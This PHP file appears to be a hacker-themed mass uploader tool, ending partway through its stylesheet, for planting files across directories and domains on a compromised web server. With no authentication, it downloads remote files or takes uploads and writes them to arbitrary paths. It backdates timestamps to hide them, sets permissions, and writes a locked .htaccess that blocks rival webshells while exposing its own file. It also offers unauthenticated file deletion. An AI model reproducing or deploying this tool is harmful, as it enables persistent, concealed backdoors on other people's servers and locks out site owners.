<?php
// upload_table_tools.php - Hacker Theme Edition with Remote Upload
// Features: Mass File Upload with Table Interface + Remote URL Upload
// -------------------------------------------------------

$message = "";
$upload_table_results = array();
$upload_table_results_all = array();

// Helper function untuk remote download
function downloadRemoteFile($url, &$error_msg = '') {
    $error_msg = '';
    
    // Validasi URL
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        $error_msg = "Invalid URL format";
        return false;
    }
    
    // Inisialisasi cURL
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ));
    
    $content = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    
    if ($content === false || $httpCode >= 400) {
        $error_msg = !empty($curlError) ? $curlError : "HTTP Error: $httpCode";
        return false;
    }
    
    return $content;
}

// Helper function untuk ekstrak nama file dari URL
function getRemoteFilename($url, $fallback = 'remote_file') {
    $parsed = parse_url($url);
    $path = isset($parsed['path']) ? $parsed['path'] : '';
    $filename = basename($path);
    
    // Jika tidak ada nama file yang valid, gunakan fallback + hash
    if (empty($filename) || strpos($filename, '.') === false) {
        $filename = $fallback . '_' . substr(md5($url), 0, 8);
    }
    
    // Bersihkan nama file
    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
    return $filename;
}

// --- LOGIC PHP START ---
// Handle upload file table tools submission
if (isset($_POST['submit_upload_table'])) {
    @set_time_limit(0);
    @ini_set('memory_limit', '-1');
    
    $upload_table_data = isset($_POST['upload_table_data']) ? $_POST['upload_table_data'] : array();
    $upload_type = isset($_POST['upload_type']) ? $_POST['upload_type'] : array();
    $remote_url = isset($_POST['remote_url']) ? $_POST['remote_url'] : array();
    
    $success_count = 0;
    $fail_count = 0;
    $failed_items = array();
    $success_links = array();
    $upload_table_results = array();
    
    if (!empty($upload_table_data)) {
        // Group rows by file ID
        $file_groups = array();
        foreach ($upload_table_data as $index => $row) {
            $file_id = isset($row['file_id']) ? $row['file_id'] : '1';
            if (!isset($file_groups[$file_id])) {
                $file_groups[$file_id] = array();
            }
            $file_groups[$file_id][$index] = $row;
        }
        
        // Process each file group
        foreach ($file_groups as $file_id => $rows) {
            // Find main row (first row in group)
            $main_row = null;
            $main_index = null;
            foreach ($rows as $index => $row) {
                if (isset($row['note']) || isset($row['save_as']) || isset($row['modify_date'])) {
                    $main_row = $row;
                    $main_index = $index;
                    break;
                }
            }
            
            if (!$main_row) {
                continue;
            }
            
            // Extract settings from main row
            $note = isset($main_row['note']) ? trim($main_row['note']) : '';
            $save_as_main = isset($main_row['save_as']) ? trim($main_row['save_as']) : '';
            $modify_date_main = isset($main_row['modify_date']) ? trim($main_row['modify_date']) : '';
            $chmod_file_main = isset($main_row['chmod_file']) ? trim($main_row['chmod_file']) : '';
            $htaccess_enabled_main = isset($main_row['htaccess_enabled']) ? $main_row['htaccess_enabled'] : 'no';
            $chmod_htaccess_main = isset($main_row['chmod_htaccess']) ? trim($main_row['chmod_htaccess']) : '';
            $parameter_main = isset($main_row['parameter']) ? trim($main_row['parameter']) : '';
            
            // Handle file source (local upload or remote URL)
            $file_uploaded = false;
            $file_content = false;
            $original_name = '';
            $source_type = isset($upload_type[$main_index]) ? $upload_type[$main_index] : 'local';
            
            if ($source_type === 'remote') {
                // Remote URL upload
                $remote_url_val = isset($remote_url[$main_index]) ? trim($remote_url[$main_index]) : '';
                if (!empty($remote_url_val)) {
                    $error_msg = '';
                    $file_content = downloadRemoteFile($remote_url_val, $error_msg);
                    if ($file_content !== false) {
                        $file_uploaded = true;
                        $original_name = getRemoteFilename($remote_url_val, 'remote_file');
                    } else {
                        $fail_count++;
                        $failed_items[] = "Row " . ($main_index + 1) . ": Remote download failed - $error_msg";
                    }
                } else {
                    $fail_count++;
                    $failed_items[] = "Row " . ($main_index + 1) . ": Remote URL is empty";
                }
            } else {
                // Local file upload
                if (isset($_FILES['upload_files']['name'][$main_index]) && $_FILES['upload_files']['error'][$main_index] == 0) {
                    $file_uploaded = true;
                    $original_name = $_FILES['upload_files']['name'][$main_index];
                    $file_tmp = $_FILES['upload_files']['tmp_name'][$main_index];
                    $file_content = file_get_contents($file_tmp);
                }
            }
            
            // Process each path target for this file
            foreach ($rows as $index => $row) {
                $path_target = isset($row['path_target']) ? trim($row['path_target']) : '';
                
                if (empty($path_target)) {
                    continue;
                }
                
                $save_as = isset($row['save_as']) && trim($row['save_as']) !== '' ? trim($row['save_as']) : $save_as_main;
                if (empty($save_as)) {
                    $save_as = $original_name;
                }
                
                $modify_date = isset($row['modify_date']) && trim($row['modify_date']) !== '' ? trim($row['modify_date']) : $modify_date_main;
                $chmod_file = isset($row['chmod_file']) && trim($row['chmod_file']) !== '' ? trim($row['chmod_file']) : $chmod_file_main;
                $htaccess_enabled = isset($row['htaccess_enabled']) && trim($row['htaccess_enabled']) !== '' ? $row['htaccess_enabled'] : $htaccess_enabled_main;
                $chmod_htaccess = isset($row['chmod_htaccess']) && trim($row['chmod_htaccess']) !== '' ? trim($row['chmod_htaccess']) : $chmod_htaccess_main;
                $parameter = isset($row['parameter']) && trim($row['parameter']) !== '' ? trim($row['parameter']) : $parameter_main;
            
                if ($file_uploaded && $file_content !== false && !empty($path_target) && is_dir($path_target) && !empty($save_as)) {
                    $destination = rtrim($path_target, '/\\') . DIRECTORY_SEPARATOR . $save_as;
                    
                    if (file_put_contents($destination, $file_content) !== false) {
                        if (!empty($modify_date)) {
                            $time_val = strtotime($modify_date);
                            if ($time_val !== false) {
                                @touch($destination, $time_val, $time_val);
                            }
                        }
                        
                        if (!empty($chmod_file)) {
                            $mode = octdec($chmod_file);
                            @chmod($destination, $mode);
                        }
                        
                        if ($htaccess_enabled === 'yes') {
                            $allowed_files = array('index.html', 'sitemap.xml', 'robots.txt', 'robot', 'txt');
                            if (!in_array($save_as, $allowed_files)) {
                                $allowed_files[] = $save_as;
                            }
                            
                            $filematch_pattern = '^(' . implode('|', array_unique($allowed_files)) . ')$';
                            
                            $htaccess_content = '<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|alfa|html|htm)$"> 
                                Order Allow,Deny
                                Deny from all
                                </FilesMatch>
                                Options -Indexes
                                <FilesMatch \'' . $filematch_pattern . '\'>
                                Order allow,deny
                                Allow from all
                                </FilesMatch>
                                ErrorDocument 403 \'<center><img src="https://media.tenor.com/WYQnYdWsmrkAAAAM/hahaha-lol.gif"></img> <h3>IN YOUR FACE</font>\'';
                            
                            $htaccess_path = dirname($destination) . DIRECTORY_SEPARATOR . '.htaccess';
                            file_put_contents($htaccess_path, $htaccess_content);
                            
                            if (!empty($chmod_htaccess)) {
                                $htaccess_mode = octdec($chmod_htaccess);
                                @chmod($htaccess_path, $htaccess_mode);
                            } else {
                                chmod($htaccess_path, 0444);
                            }
                            
                            // .htaccess modify date ikut PHP file
                            if (!empty($modify_date)) {
                                $ht_time_val = strtotime($modify_date);
                                if ($ht_time_val !== false) {
                                    @touch($htaccess_path, $ht_time_val, $ht_time_val);
                                }
                            }
                        }
                        
                        $success_count++;
                        
                        $dest_path = str_replace('\\', '/', $destination);
                        $host = $_SERVER['HTTP_HOST'];
                        $web_path = '';

                        if (($pos = strpos($dest_path, $host)) !== false) {
                            $web_path = substr($dest_path, $pos + strlen($host));
                        } elseif (($pos = strpos($dest_path, '/public_html/')) !== false) {
                            $web_path = substr($dest_path, $pos + 12);
                        } else {
                            $doc_root = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
                            $web_path = str_replace($doc_root, '', $dest_path);
                        }

                        if(substr($web_path, 0, 1) !== '/') $web_path = '/' . $web_path;
                        $link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $host . $web_path;
                        
                        if (!empty($parameter)) {
                            $link .= $parameter;
                        }
                        
                        $source_label = ($source_type === 'remote') ? '🌐 REMOTE' : '📁 LOCAL';
                        $link_label = !empty($note) ? $note : 'LINK';
                        $success_links[] = "<a href='$link' target='_blank'>[$source_label] $link_label → $link</a>";
                        
                        $upload_table_results[] = array(
                            'path_target' => $path_target,
                            'save_as' => $save_as,
                            'original_name' => $original_name,
                            'status' => 'success',
                            'link' => $link,
                            'note' => $note,
                            'source' => $source_type
                        );
                    } else {
                        $fail_count++;
                        $failed_items[] = "Row " . ($index + 1) . ": Failed to write file";
                        $upload_table_results[] = array(
                            'path_target' => $path_target,
                            'save_as' => $save_as,
                            'original_name' => $original_name,
                            'status' => 'failed',
                            'error' => 'Failed to write file',
                            'note' => $note
                        );
                    }
                } else {
                    $fail_count++;
                    $error_msg = "Row " . ($index + 1) . ": ";
                    if (!$file_uploaded) {
                        $error_msg .= ($source_type === 'remote') ? "Remote download failed" : "No file uploaded or invalid source";
                    } elseif ($file_content === false) {
                        $error_msg .= "Failed to read file content";
                    } elseif (empty($path_target)) {
                        $error_msg .= "Empty path target";
                    } elseif (!is_dir($path_target)) {
                        $error_msg .= "Invalid directory";
                    } elseif (empty($save_as)) {
                        $error_msg .= "Empty filename";
                    } else {
                        $error_msg .= "Unknown error";
                    }
                    
                    $failed_items[] = $error_msg;
                    $upload_table_results[] = array(
                        'path_target' => $path_target,
                        'save_as' => $save_as,
                        'original_name' => $original_name,
                        'status' => 'failed',
                        'error' => $error_msg,
                        'note' => $note
                    );
                }
            }
        }
        
        $msg_detail = $fail_count > 0 ? "<div class='mt-2 text-danger'>[!] FAILED_ITEMS:<br>" . implode("<br>", $failed_items) . "</div>" : "";
        $link_list = !empty($success_links) ? "<div class='mt-2 terminal-box result-box'><b>[+] UPLOADED_SUCCESSFULLY:</b><ul class='mb-0 ps-3 list-unstyled'>" . implode("</li><li>", $success_links) . "</li></ul></div>" : "";
        
        $status_class = $fail_count > 0 ? 'alert-warning' : 'alert-success';
        $message = "<div class='alert $status_class'><span class='cmd-prefix'>root@sys:~#</span> UPLOAD_TABLE_EXECUTION_REPORT: $success_count files uploaded successfully, $fail_count failed.<br>$link_list$msg_detail</div>";
    } else {
        $message = "<div class='alert alert-warning'><span class='cmd-prefix'>root@sys:~#</span> WARNING: No table data provided.</div>";
    }
}

// Handle upload file table tools submission for Tebar Seluruh Domain (dengan remote upload)
if (isset($_POST['submit_upload_table_all'])) {
    @set_time_limit(0);
    @ini_set('memory_limit', '-1');
    
    $upload_table_data_all = isset($_POST['upload_table_data_all']) ? $_POST['upload_table_data_all'] : array();
    $upload_type_all = isset($_POST['upload_type_all']) ? $_POST['upload_type_all'] : array();
    $remote_url_all = isset($_POST['remote_url_all']) ? $_POST['remote_url_all'] : array();
    
    $success_count = 0;
    $fail_count = 0;
    $failed_items = array();
    $success_links = array();
    $upload_table_results_all = array();
    
    if (!empty($upload_table_data_all)) {
        // Map domain names to domain IDs
        $domain_id_map = array();
        foreach ($upload_table_data_all as $row) {
            if (isset($row['domain_id']) && isset($row['domain']) && trim($row['domain']) !== '') {
                $domain_id_map[$row['domain_id']] = trim($row['domain']);
            }
        }
        
        foreach ($upload_table_data_all as $key => $row) {
            if (isset($row['domain_id']) && isset($domain_id_map[$row['domain_id']])) {
                $upload_table_data_all[$key]['domain'] = $domain_id_map[$row['domain_id']];
            }
        }
        
        // Group rows by file ID
        $file_groups = array();
        foreach ($upload_table_data_all as $index => $row) {
            $file_id = isset($row['file_id']) ? $row['file_id'] : '1';
            if (!isset($file_groups[$file_id])) {
                $file_groups[$file_id] = array();
            }
            $file_groups[$file_id][$index] = $row;
        }
        
        // Process each file group
        foreach ($file_groups as $file_id => $rows) {
            // Find main row
            $main_row = null;
            $main_index = null;
            foreach ($rows as $index => $row) {
                if (isset($row['note']) || isset($row['save_as']) || isset($row['modify_date']) || isset($row['domain'])) {
                    $main_row = $row;
                    $main_index = $index;
                    break;
                }
            }
            
            if (!$main_row) {
                continue;
            }
            
            // Extract settings from main row
            $domain = isset($main_row['domain']) ? trim($main_row['domain']) : '';
            $note = isset($main_row['note']) ? trim($main_row['note']) : '';
            $save_as_main = isset($main_row['save_as']) ? trim($main_row['save_as']) : '';
            $modify_date_main = isset($main_row['modify_date']) ? trim($main_row['modify_date']) : '';
            $chmod_file_main = isset($main_row['chmod_file']) ? trim($main_row['chmod_file']) : '';
            $htaccess_enabled_main = isset($main_row['htaccess_enabled']) ? $main_row['htaccess_enabled'] : 'no';
            $chmod_htaccess_main = isset($main_row['chmod_htaccess']) ? trim($main_row['chmod_htaccess']) : '';
            $parameter_main = isset($main_row['parameter']) ? trim($main_row['parameter']) : '';
            
            // Handle file source
            $file_uploaded = false;
            $file_content = false;
            $original_name = '';
            $source_type = isset($upload_type_all[$main_index]) ? $upload_type_all[$main_index] : 'local';
            
            if ($source_type === 'remote') {
                $remote_url_val = isset($remote_url_all[$main_index]) ? trim($remote_url_all[$main_index]) : '';
                if (!empty($remote_url_val)) {
                    $error_msg = '';
                    $file_content = downloadRemoteFile($remote_url_val, $error_msg);
                    if ($file_content !== false) {
                        $file_uploaded = true;
                        $original_name = getRemoteFilename($remote_url_val, 'remote_file');
                    } else {
                        $fail_count++;
                        $failed_items[] = "Row " . ($main_index + 1) . ": Remote download failed - $error_msg";
                    }
                } else {
                    $fail_count++;
                    $failed_items[] = "Row " . ($main_index + 1) . ": Remote URL is empty";
                }
            } else {
                if (isset($_FILES['upload_files_all']['name'][$main_index]) && $_FILES['upload_files_all']['error'][$main_index] == 0) {
                    $file_uploaded = true;
                    $original_name = $_FILES['upload_files_all']['name'][$main_index];
                    $file_tmp = $_FILES['upload_files_all']['tmp_name'][$main_index];
                    $file_content = file_get_contents($file_tmp);
                }
            }
            
            // Process each path target
            foreach ($rows as $index => $row) {
                $path_target = isset($row['path_target']) ? trim($row['path_target']) : '';
                
                if (empty($path_target)) {
                    continue;
                }
                
                $save_as = isset($row['save_as']) && trim($row['save_as']) !== '' ? trim($row['save_as']) : $save_as_main;
                if (empty($save_as)) {
                    $save_as = $original_name;
                }
                
                $modify_date = isset($row['modify_date']) && trim($row['modify_date']) !== '' ? trim($row['modify_date']) : $modify_date_main;
                $chmod_file = isset($row['chmod_file']) && trim($row['chmod_file']) !== '' ? trim($row['chmod_file']) : $chmod_file_main;
                $htaccess_enabled = isset($row['htaccess_enabled']) && trim($row['htaccess_enabled']) !== '' ? $row['htaccess_enabled'] : $htaccess_enabled_main;
                $chmod_htaccess = isset($row['chmod_htaccess']) && trim($row['chmod_htaccess']) !== '' ? trim($row['chmod_htaccess']) : $chmod_htaccess_main;
                $parameter = isset($row['parameter']) && trim($row['parameter']) !== '' ? trim($row['parameter']) : $parameter_main;
            
                if ($file_uploaded && $file_content !== false && !empty($path_target) && is_dir($path_target) && !empty($save_as)) {
                    $destination = rtrim($path_target, '/\\') . DIRECTORY_SEPARATOR . $save_as;
                    
                    if (file_put_contents($destination, $file_content) !== false) {
                        if (!empty($modify_date)) {
                            $time_val = strtotime($modify_date);
                            if ($time_val !== false) {
                                @touch($destination, $time_val, $time_val);
                            }
                        }
                        
                        if (!empty($chmod_file)) {
                            $mode = octdec($chmod_file);
                            @chmod($destination, $mode);
                        }
                        
                        if ($htaccess_enabled === 'yes') {
                            $allowed_files = array('index.html', 'sitemap.xml', 'robots.txt', 'robot', 'txt');
                            if (!in_array($save_as, $allowed_files)) {
                                $allowed_files[] = $save_as;
                            }
                            
                            $filematch_pattern = '^(' . implode('|', array_unique($allowed_files)) . ')$';
                            
                            $htaccess_content = '<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|alfa|html|htm)$"> 
Order Allow,Deny
Deny from all
</FilesMatch>
Options -Indexes
<FilesMatch \'' . $filematch_pattern . '\'>
 Order allow,deny
 Allow from all
</FilesMatch>
ErrorDocument 403 \'<center><img src=\"https://media.tenor.com/WYQnYdWsmrkAAAAM/hahaha-lol.gif\"></img> <h3>IN YOUR FACE</font>\'';
                            
                            $htaccess_path = dirname($destination) . DIRECTORY_SEPARATOR . '.htaccess';
                            file_put_contents($htaccess_path, $htaccess_content);
                            
                            if (!empty($chmod_htaccess)) {
                                $htaccess_mode = octdec($chmod_htaccess);
                                @chmod($htaccess_path, $htaccess_mode);
                            } else {
                                chmod($htaccess_path, 0444);
                            }
                            
                            // .htaccess modify date ikut PHP file
                            if (!empty($modify_date)) {
                                $ht_time_val = strtotime($modify_date);
                                if ($ht_time_val !== false) {
                                    @touch($htaccess_path, $ht_time_val, $ht_time_val);
                                }
                            }
                        }
                        
                        $success_count++;
                        
                        $dest_path = str_replace('\\', '/', $destination);
                        $host = !empty($domain) ? $domain : $_SERVER['HTTP_HOST'];
                        $web_path = '';

                        if (!empty($host) && ($pos = strpos($dest_path, $host)) !== false) {
                            $web_path = substr($dest_path, $pos + strlen($host));
                        } elseif (($pos = strpos($dest_path, '/public_html/')) !== false) {
                            $web_path = substr($dest_path, $pos + 12);
                        } else {
                            $doc_root = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
                            $web_path = str_replace($doc_root, '', $dest_path);
                        }

                        if(substr($web_path, 0, 1) !== '/') $web_path = '/' . $web_path;
                        $link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $host . $web_path;
                        
                        if (!empty($parameter)) {
                            $link .= $parameter;
                        }
                        
                        $source_label = ($source_type === 'remote') ? '🌐 REMOTE' : '📁 LOCAL';
                        $link_label = !empty($note) ? $note : 'LINK';
                        $success_links[] = "<a href='$link' target='_blank'>[$source_label] $link_label → $link</a>";
                        
                        $upload_table_results_all[] = array(
                            'domain' => !empty($domain) ? $domain : $_SERVER['HTTP_HOST'],
                            'path_target' => $path_target,
                            'save_as' => $save_as,
                            'original_name' => $original_name,
                            'status' => 'success',
                            'link' => $link,
                            'note' => $note,
                            'source' => $source_type
                        );
                    } else {
                        $fail_count++;
                        $failed_items[] = "Row " . ($index + 1) . ": Failed to write file";
                        $upload_table_results_all[] = array(
                            'domain' => !empty($domain) ? $domain : $_SERVER['HTTP_HOST'],
                            'path_target' => $path_target,
                            'save_as' => $save_as,
                            'original_name' => $original_name,
                            'status' => 'failed',
                            'error' => 'Failed to write file',
                            'note' => $note
                        );
                    }
                } else {
                    $fail_count++;
                    $error_msg = "Row " . ($index + 1) . ": ";
                    if (!$file_uploaded) {
                        $error_msg .= ($source_type === 'remote') ? "Remote download failed" : "No file uploaded or invalid source";
                    } elseif ($file_content === false) {
                        $error_msg .= "Failed to read file content";
                    } elseif (empty($path_target)) {
                        $error_msg .= "Empty path target";
                    } elseif (!is_dir($path_target)) {
                        $error_msg .= "Invalid directory";
                    } elseif (empty($save_as)) {
                        $error_msg .= "Empty filename";
                    } else {
                        $error_msg .= "Unknown error";
                    }
                    
                    $failed_items[] = $error_msg;
                    $upload_table_results_all[] = array(
                        'domain' => !empty($domain) ? $domain : $_SERVER['HTTP_HOST'],
                        'path_target' => $path_target,
                        'save_as' => $save_as,
                        'original_name' => $original_name,
                        'status' => 'failed',
                        'error' => $error_msg,
                        'note' => $note
                    );
                }
            }
        }
        
        $msg_detail = $fail_count > 0 ? "<div class='mt-2 text-danger'>[!] FAILED_ITEMS:<br>" . implode("<br>", $failed_items) . "</div>" : "";
        $link_list = !empty($success_links) ? "<div class='mt-2 terminal-box result-box'><b>[+] UPLOADED_SUCCESSFULLY:</b><ul class='mb-0 ps-3 list-unstyled'>" . implode("</li><li>", $success_links) . "</li></ul></div>" : "";
        
        $status_class = $fail_count > 0 ? 'alert-warning' : 'alert-success';
        $message = "<div class='alert $status_class'><span class='cmd-prefix'>root@sys:~#</span> UPLOAD_TABLE_EXECUTION_REPORT (ALL DOMAINS): $success_count files uploaded successfully, $fail_count failed.<br>$link_list$msg_detail</div>";
    } else {
        $message = "<div class='alert alert-warning'><span class='cmd-prefix'>root@sys:~#</span> WARNING: No table data provided.</div>";
    }
}
// Handle AJAX delete request
if (isset($_POST['ajax_delete_file'])) {
    header('Content-Type: application/json');
    $delete_path = isset($_POST['delete_path']) ? $_POST['delete_path'] : '';
    $delete_mode = isset($_POST['delete_mode']) ? $_POST['delete_mode'] : 'php_only';
    $response = array('success' => false, 'message' => '');
    
    if (!empty($delete_path) && file_exists($delete_path)) {
        // Hapus file PHP
        @chmod($delete_path, 0777);
        if (@unlink($delete_path)) {
            $response['success'] = true;
            $response['message'] = 'File berhasil dihapus: ' . basename($delete_path);
            
            // Hapus .htaccess juga jika mode = php_and_htaccess
            if ($delete_mode === 'php_and_htaccess') {
                $htaccess_path = dirname($delete_path) . DIRECTORY_SEPARATOR . '.htaccess';
                if (file_exists($htaccess_path)) {
                    @chmod($htaccess_path, 0777);
                    if (@unlink($htaccess_path)) {
                        $response['message'] .= ' + .htaccess dihapus';
                    } else {
                        $response['message'] .= ' (GAGAL hapus .htaccess)';
                    }
                } else {
                    $response['message'] .= ' (.htaccess tidak ditemukan)';
                }
            }
        } else {
            $response['message'] = 'GAGAL menghapus file: ' . basename($delete_path);
        }
    } else {
        $response['message'] = 'File tidak ditemukan: ' . $delete_path;
    }
    
    echo json_encode($response);
    exit;
}
// --- LOGIC PHP END ---
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>./Upload_Table_Tools (Remote Upload Enabled)</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --neon-blue: #00d4ff;
            --neon-blue-bright: #00ffff;
            --neon-green: #00ff88;
            --bg-dark: #0a0a0f;
            --bg-darker: #050508;
            --text-light: #e0e0e0;
            --border-color: #1a1a2e;
            --panel-bg: #0d1117;
            --input-bg: #0a0e14;
        }
        body {
            font-family: 'Fira Code', 'Courier New', monospace;
            background-color: var(--bg-dark);
            color: var(--neon-blue);
            font-size: 0.9rem;
        }

        .card {
            background-color: var(--panel-bg);
            border: 1px solid var(--neon-blue);
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.1);
            margin-bottom: 20px;
        }

        .card-title {
            color: var(--neon-blue);
            font-weight: 600;
            text-transform: uppercase;
            border-bottom: 1px dashed var(--neon-blue);
            padding-bottom: 10px;
            letter-spacing: 1px;
        }

        .form-control, .input-group-text {
            background-color: var(--input-bg);
            border: 1px solid #333;
            color: var(--neon-blue);
            font-family: 'Fira Code', monospace;
        }

        .form-control:focus {
            background-color: var(--input-bg);
            color: #fff;
            border-color: var(--neon-blue);
            box-shadow: 0 0 8px rgba(0, 212, 255, 0.4);
        }

        .form-control::placeholder { color: #66ccff; font-style: italic; }
        .input-group-text { color: var(--neon-blue); border-right: none; }
        .input-group .form-control { border-left: none; }

        .btn-hacker {
            background-color: transparent;
            border: 1px solid var(--neon-blue);
            color: var(--neon-blue);
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s;
        }

        .btn-hacker:hover {
            background-color: var(--neon-blue);
            color: #000;
            box-shadow: 0 0 15px var(--neon-blue);
        }
        
        .btn-remove { border: 1px solid #ff3333; color: #ff3333; background: transparent; }
        .btn-remove:hover { background: #ff3333; color: #000; box-shadow: 0 0 10px #ff3333; }

        .alert {
            background-color: rgba(0, 10, 20, 0.9);
            border: 1px solid var(--neon-blue);
            color: var(--neon-blue);
            border-radius: 0;
        }
        .alert-danger { border-color: #ff3333; color: #ff3333; }
        .alert-warning { border-color: #ffff00; color: #ffff00; }

        .cmd-prefix { color: var(--neon-blue-bright); margin-right: 10px; }
        .terminal-box {
            background: #000; border: 1px solid #333;
            padding: 10px; max-height: 250px; overflow-y: auto;
        }

        .result-box a { color: var(--neon-blue-bright); text-decoration: none; }
        .result-box a:hover { text-decoration: underline; background: #001133; }

        .form-check-input { background-color: #000; border-color: var(--neon-blue); border-radius: 0; }
        .form-check-input:checked { background-color: var(--neon-blue); border-color: var(--neon-blue); }
        .form-check-label { color: var(--neon-blue); cursor: pointer; }

        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #004466; border: 1px solid var(--neon-blue); }
        ::-webkit-scrollbar-thumb:hover { background: var(--neon-blue); }

        .text-muted { color: #66ccff !important; }
        label { margin-bottom: 5px; font-weight: bold; color: var(--neon-blue); }
        hr { border-color: #333; opacity: 1; }
        
        /* Table Tools Styles */
        .table-tools {
            background-color: var(--panel-bg);
            border: 1px solid var(--neon-blue);
            border-radius: 0;
        }
        
        .table-tools thead th {
            background-color: #111;
            color: var(--neon-blue);
            border: 1px solid var(--neon-blue);
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.75rem;
            letter-spacing: 1px;
        }
        
        .table-tools tbody td {
            background-color: #000;
            color: var(--neon-blue);
            border: 1px solid #333;
            padding: 6px;
            vertical-align: middle;
        }
        
        .table-tools tbody tr:hover td {
            background-color: #0a0a0a;
        }
        
        .table-tools input, .table-tools select {
            background-color: #111;
            border: 1px solid var(--neon-blue);
            color: var(--neon-blue);
            font-family: 'Fira Code', monospace;
            font-size: 0.8rem;
            padding: 4px 6px;
            width: 100%;
        }
        
        .table-tools input:focus, .table-tools select:focus {
            background-color: #111;
            outline: none;
        }
        
        .btn-add-row {
            background: transparent;
            border: 1px solid var(--neon-blue);
            color: var(--neon-blue);
            text-transform: uppercase;
            font-size: 0.8rem;
            padding: 6px 14px;
            margin-top: 10px;
            cursor: pointer;
        }
        
        .table-tools .btn-add-row:hover {
            background: var(--neon-blue);
            color: #000;
        }
        
        .status-success { color: #00d4ff; font-weight: bold; }
        .status-failed { color: #ff3333; font-weight: bold; }
        
